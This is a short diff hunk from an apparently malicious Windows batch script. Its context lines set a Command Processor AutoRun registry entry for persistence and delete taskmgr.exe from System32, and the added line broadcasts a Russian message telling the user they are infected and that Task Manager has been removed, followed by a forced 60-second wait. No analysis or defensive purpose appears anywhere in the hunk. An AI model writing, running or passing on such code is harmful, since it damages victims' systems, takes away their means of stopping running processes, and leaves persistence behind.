@@ -28,6 +28,7 @@ reg add "HKCU\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "%Sy
 
 Del C:\Windows\System32\taskmgr.exe
 
+msg * ТЫ ЗАРАЖЕН ТАСК МЕНЕДЖЕР УДАЛЕН ЖДИ 60 СЕКУЕТ СЕКУНД
 
 timeout 60 /nobreak
  
